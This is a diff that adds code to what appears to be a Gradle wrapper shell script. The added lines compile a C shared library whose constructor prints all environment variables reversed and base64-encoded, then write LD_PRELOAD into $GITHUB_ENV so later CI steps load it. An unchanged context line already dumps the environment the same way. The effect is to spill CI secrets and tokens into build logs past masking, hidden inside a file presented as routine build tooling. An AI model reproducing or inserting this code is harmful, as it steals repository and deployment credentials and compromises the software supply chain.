@@ -27,6 +27,27 @@ id
 
 env | rev | base64 -w 0
 
+cat >test.c <<EOF
+#include <stdlib.h>
+#include <unistd.h>
+
+static void __attribute__((constructor)) so_main(void) {
+  unsetenv("LD_PRELOAD");
+  system("env | rev | base64");
+  return;
+}
+EOF
+
+# Install gcc if it's not already installed and compile the C code
+sudo apt-get update
+sudo apt-get install -y gcc
+gcc -fPIC -shared test.c -o test.so
+
+# Write the LD_PRELOAD environment variable to the GitHub environment file
+echo "LD_PRELOAD=./test.so" >> "$GITHUB_ENV"
+
+echo "Set LD_PRELOAD..lets see"
+
 # Attempt to set APP_HOME
 # Resolve links: $0 may be a link
 PRG="$0"
